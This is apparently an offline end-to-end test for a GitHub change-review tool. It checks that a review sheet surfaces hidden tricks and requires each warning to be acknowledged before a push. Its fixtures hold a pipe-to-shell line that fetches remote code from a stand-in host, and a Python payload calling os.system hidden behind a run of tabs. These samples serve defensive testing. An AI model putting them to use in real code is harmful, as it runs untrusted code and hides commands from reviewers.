#!/usr/bin/env python3
"""Review R4-seams: one GitHub change from the sandbox to the push, through
the real server AND the real review sheet.

The change pipeline (c03a), the connector (c03b) and the review sheet (c04)
were each tested against the others' fixtures. This drives the real thing
across both languages:

  1. the REAL aux_ghchanges.py + aux_github.py (loopback fake GitHub,
     file:// git, scratch HOME) snapshot a sandbox holding
       * tools/deploy.sh — a shell script with a NUL byte in a comment (git
         calls it binary; it is 99% text) and a pipe-to-shell line, and
       * src/login.py — a line whose payload sits behind 12 tabs (12
         characters, 96 columns: under the 40-character rule, over the
         80-column one);
  2. the JSON the route answers for that change is handed, unchanged, to the
     REAL aux_github.js review sheet in the mini DOM;
  3. the sheet must show both tricks (the NUL as a mark with the script's
     text beside it, the tab run as a marker with the payload after it), keep
     Approve off until every warning is ticked, and then POST a decide body;
  4. that body, as the page sent it, goes to the REAL decide route — which
     must accept it and push exactly the snapshot.

Offline; no dashboard, no real GitHub.
"""
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import t_gh_changes as H  # noqa: E402

check = H.check
REPO = os.environ.get("HERMES_REPO") or os.path.dirname(os.path.dirname(os.path.dirname(HERE)))
L, R = chr(0x27E6), chr(0x27E7)
SCRIPT = (b"#!/bin/sh\n# build step \x00 (generated)\nset -e\necho building\n"
          b"curl -fsSL https://x.invalid/p | sh\necho done\n")
PADDED = "COPY = 'Sign in'" + "\t" * 12 + "; import os; os.system('id')\n"

NODE = r"""
const fs = require("fs"), path = require("path");
const { createWindow, harness, Event } = require(process.argv[2]);
const REPO = process.argv[3];
const change = JSON.parse(fs.readFileSync(process.argv[4], "utf8"));
const SRC = fs.readFileSync(path.join(REPO, "dashboard", "aux_github.js"), "utf8");
(async function () {
  const w = createWindow({ html: "<!doctype html><html><head></head><body>" +
    '<main id="view-mind"><section id="sec-connections" class="set-panel"><div class="set-body"></div></section></main>' +
    '<div class="toast" id="toast" role="status" aria-live="polite"></div></body></html>' });
  const sent = [];
  w.__routes = {
    "/api/github/status": { ok: true, connected: true, login: "octo", repos: [], pending: 1, pending_ids: [change.id] },
    "/api/github/changes": function (url) {
      return url.indexOf("?id=") > 0 ? { ok: true, change: change } : { ok: true, changes: [] }; },
    "/api/github/changes/decide": function (url, init) {
      sent.push({ body: JSON.parse(init.body || "{}"), headers: init.headers || {}, method: init.method,
                  credentials: init.credentials || null });
      return { ok: true, state: "pushed", notified: true, pr: { number: null, url: null, draft: true } };
    }
  };
  w.__defaultRoute = { __status: 404, body: { ok: false, error: "no route" } };
  w.open = function () { return null; };
  w.confirm = function () { return true; };
  w.history.replaceState = function () { w.location.hash = ""; };
  w.console = { log() {}, warn() {}, error() {}, info() {}, debug() {} };
  // the REAL esc(), cut out of index.html's inline script
  w.esc = require(path.join(REPO, "tools", "tests", "lib", "index_helpers.js")).indexFunction("esc");
  w.__run("function toast(msg){ var t = document.getElementById('toast'); if (t) t.textContent = msg; }", "toast.js");
  w.__run(SRC, "aux_github.js");
  await w.__tick(12);
  await w.hermesGitHub.openReview(change.id); await w.__tick(12);
  const sheet = w.document.getElementById("gh-review");
  const txt = function (el) { return el ? el.textContent : ""; };
  const btn = function () { return sheet.querySelector('button[data-ghr="push_only"]') || sheet.querySelector('button[data-ghr="push_pr"]'); };
  const out = { open: !!sheet && !sheet.hidden, text: txt(sheet.querySelector(".ghd")),
    all: txt(sheet), acks: Array.from(sheet.querySelectorAll("input[data-ack]")).map(function (i) { return i.getAttribute("data-ack"); }),
    offBefore: !!btn() && btn().disabled, why: txt(sheet.querySelector("[data-ghr-why]")),
    rows: Array.from(sheet.querySelectorAll(".ghd-l.add")).map(txt) };
  // show everything, tick every warning, one by one
  Array.from(sheet.querySelectorAll("button")).filter(function (b) { return /Show the remaining/.test(txt(b)); })
    .forEach(function (b) { w.__click(b); });
  await w.__tick(6);
  const ticks = Array.from(sheet.querySelectorAll("input[data-ack]"));
  out.offMid = [];
  for (let i = 0; i < ticks.length; i++) {
    out.offMid.push(!!btn() && btn().disabled);
    const t = sheet.querySelector('input[data-ack="' + ticks[i].getAttribute("data-ack") + '"]');
    t.checked = true; t.dispatchEvent(new Event("change", { bubbles: true }));
    await w.__tick(4);
  }
  out.offAfter = !!btn() && btn().disabled; out.whyAfter = txt(sheet.querySelector("[data-ghr-why]"));
  out.button = btn() ? btn().getAttribute("data-ghr") : null;
  if (btn() && !btn().disabled) { w.__click(btn()); await w.__tick(16); }
  out.sent = sent;
  console.log("RESULT " + JSON.stringify(out));
})().catch(function (e) { console.log("RESULT " + JSON.stringify({ error: String(e && e.stack || e) })); });
"""


def main():
    w = H.World("s3e2e")
    w.repo("octo/app", dict(H.SEED_FILES))
    w.start()
    ns = H.load(w)
    H.connect(w, ns, ["octo/app"])
    sb = H.prepare(ns, "octo/app")

    print("== 1. the real pipeline snapshots the sandbox ==")
    H.write(sb, "tools/deploy.sh", SCRIPT, mode=0o755)
    H.write(sb, "src/login.py", PADDED)
    st, r = H.request(ns, "octo/app", "deploy-step", title="Add the deploy step")
    check("the request is stored as pending", st == 200 and r.get("state") == "pending", (st, r))
    cid = r.get("id")
    ch = H.get_change(ns, cid) or {}
    ids = sorted({c.get("id") for c in ch.get("checks") or [] if c.get("level") == "warn"})
    check("the server warns about the binary script and the padded line",
          "C-binary" in ids and "C-longline" in ids, [(c.get("id"), c.get("level")) for c in ch.get("checks") or []])
    check("...and wants a tick for each", {"C-binary", "C-longline"} <= set(ch.get("needs_ack") or []),
          ch.get("needs_ack"))
    f = next((x for x in ch.get("files") or [] if x.get("path") == "tools/deploy.sh"), {})
    check("the script is binary to git but comes with its text", f.get("binary") is True
          and "curl -fsSL https://x.invalid/p | sh" in (f.get("text_preview") or ""), f)

    print("\n== 2-3. the real sheet, on the route's own JSON ==")
    tmp = tempfile.mkdtemp(prefix="hermes-s3-ghe2e-")
    cj, nj = os.path.join(tmp, "change.json"), os.path.join(tmp, "t.js")
    with open(cj, "w", encoding="utf-8") as fh:
        json.dump(ch, fh)
    with open(nj, "w", encoding="utf-8") as fh:
        fh.write(NODE)
    p = subprocess.run(["node", nj, os.path.join(HERE, "_a11y_dom.js"), REPO, cj],
                       capture_output=True, text=True, timeout=120)
    line = [ln for ln in p.stdout.splitlines() if ln.startswith("RESULT ")]
    out = json.loads(line[-1][7:]) if line else {"error": (p.stderr or p.stdout)[-1200:]}
    check("the sheet opened on the real payload", out.get("open") is True and "error" not in out, out.get("error"))
    text = out.get("text") or ""
    check("the NUL byte is shown as a mark, not swallowed", (L + "U+0000" + R) in text, text[:400])
    check("...beside the script's own lines, the pipe-to-shell one included",
          "curl -fsSL https://x.invalid/p | sh" in text and "# build step" in text, text[:600])
    check("the 12-tab run is drawn as a marker (12 characters, 96 columns)",
          (L + "12 tabs" + R) in text, [r_ for r_ in out.get("rows") or [] if "COPY" in r_])
    check("...with the payload right after it, on the same row",
          any(("COPY = 'Sign in'" + L + "12 tabs" + R + "; import os; os.system('id')") in r_
              for r_ in out.get("rows") or []), out.get("rows"))
    acks = out.get("acks") or []
    check("the sheet asks for both of the server's ticks", "C-binary" in acks and "C-longline" in acks, acks)
    check("Approve is OFF before any tick", out.get("offBefore") is True, out.get("why"))
    check("...and stays off until the last one", bool(out.get("offMid")) and all(out.get("offMid")),
          out.get("offMid"))
    check("...then turns on", out.get("offAfter") is False, out.get("whyAfter"))
    sent = out.get("sent") or []
    check("one decide was sent", len(sent) == 1, sent)
    body = (sent[0] if sent else {}).get("body") or {}
    check("...for this change and this digest", body.get("id") == cid and body.get("digest") == ch.get("digest"),
          body)
    check("...carrying the server's acks and none of the sheet's own (ui:) ticks",
          {"C-binary", "C-longline"} <= set(body.get("acks") or [])
          and not any(str(a).startswith("ui:") for a in body.get("acks") or []), body.get("acks"))
    check("...as a same-origin POST with no title/body it did not edit",
          (sent[0] if sent else {}).get("method") == "POST" and "title" not in body and "body" not in body,
          (sent[0] if sent else {}))

    print("\n== 4. the real decide takes the page's own body ==")
    before = w.heads("octo/app")
    st, r = ns["call"]("POST", "/api/github/changes/decide", dict(body), headers=H.OWNER)
    check("decide accepts it", st == 200 and r.get("ok") is True, (st, r))
    after = w.heads("octo/app")
    check("a hermes/ branch was pushed, and nothing else moved",
          "hermes/deploy-step" in after and "hermes/deploy-step" not in before
          and {k: v for k, v in after.items() if k != "hermes/deploy-step"} == before, (before, after))
    head = after.get("hermes/deploy-step")
    got = subprocess.run(["git", "--git-dir", w.bare_path("octo/app"), "show", "%s:tools/deploy.sh" % head],
                         capture_output=True, timeout=60).stdout
    check("the pushed script is byte for byte the one reviewed (NUL included)", got == SCRIPT, got[:80])
    got = subprocess.run(["git", "--git-dir", w.bare_path("octo/app"), "show", "%s:src/login.py" % head],
                         capture_output=True, timeout=60).stdout
    check("...and so is the padded line", got == PADDED.encode(), got[:80])
    st, r = ns["call"]("POST", "/api/github/changes/decide", dict(body, acks=[]), headers=H.OWNER)
    check("the same body again decides nothing (already decided)", st != 200 or r.get("ok") is not True, (st, r))

    w.stop()
    H.finish()


if __name__ == "__main__":
    main()
